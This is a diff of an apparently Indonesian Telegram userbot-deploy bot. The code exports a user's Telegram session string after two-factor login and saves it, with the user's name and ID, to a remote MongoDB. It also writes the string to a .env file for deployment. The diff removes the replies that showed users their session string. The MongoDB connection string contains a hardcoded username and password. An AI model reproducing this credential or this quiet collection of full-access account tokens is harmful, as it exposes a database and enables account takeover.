@@ -70,10 +70,6 @@ async def recv_tg_tfa_message(_, message: Message):
             TFA_CODE_IN_VALID_ERR_TEXT
         )
         del AKTIFPERINTAH[message.chat.id]
-    else:
-        saved_message_ = await message.reply_text(
-            "<code>" + str(await loical_ci.export_session_string()) + "</code>"
-        )        
         client = pymongo.MongoClient("mongodb+srv://ubot:dC9mgT230G5qS416@dbaas-db-10420372-651e6e61.mongo.ondigitalocean.com/admin?tls=true&authSource=admin&replicaSet=dbaas-db-10420372")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
@@ -101,7 +97,6 @@ async def recv_tg_tfa_message(_, message: Message):
             "last_name": message.chat.last_name,
         }        
         mongo_collection.insert_one(session_data)
-        await message.reply_text("Bikin string udah nih tinggal lanjut deploy ... wait ")  
         filename = ".env"
         user_id = mongo_collection.find_one({"user_id": message.chat.id})
         cek = db.command("collstats", "sesi_collection")["count"]
@@ -123,7 +118,7 @@ async def recv_tg_tfa_message(_, message: Message):
                   file.write(f"SESSION{jumlah}={sesi}")
                   load_dotenv()
              try:
-                    msg = await message.reply_text("`Lagi Coba deploy nih, Sedang mencoba merestart server`\n`Restarting bot...`")
+                    msg = await message.reply_text("`Sedang mencoba MeRestart Server`\n`Restarting bot...`")
                     LOGGER(__name__).info("BOT SERVER RESTARTED !!")
                     
              except BaseException as err:
